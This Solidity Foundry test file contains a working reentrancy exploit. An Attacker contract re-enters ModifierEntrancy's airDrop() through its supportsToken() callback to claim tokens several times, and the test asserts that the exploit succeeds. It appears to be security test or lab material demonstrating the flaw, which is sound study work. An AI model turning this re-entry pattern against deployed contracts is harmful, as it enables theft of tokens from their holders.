
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ModifierEntrancy} from "../src/ModifierEntrancy.sol";

contract TestReentrancyModifierEntrancy is Test {
    
    ModifierEntrancy public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ModifierEntrancy();

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal > 0 && attackVal < 10);

        
        
        

        

        

        _attacker.setupAttack(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ModifierEntrancy public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = ModifierEntrancy(victimAddress);
    }

    function setupAttack(uint256 val) public {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        storedAttackVal = val;
    }

    function attack(uint256 val) public {
        
        
        _victim.airDrop();

        
        if (_victim.tokenBalance(address(this)) == 20 * (storedAttackVal + 1)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            
            
            
        }
    }

    function supportsToken() external returns(bytes32) {
        if (attackCallCount < storedAttackVal) {
            attackCallCount++;
            _victim.airDrop();
        }
        return(keccak256(abi.encodePacked("Nu Token")));
    }
}
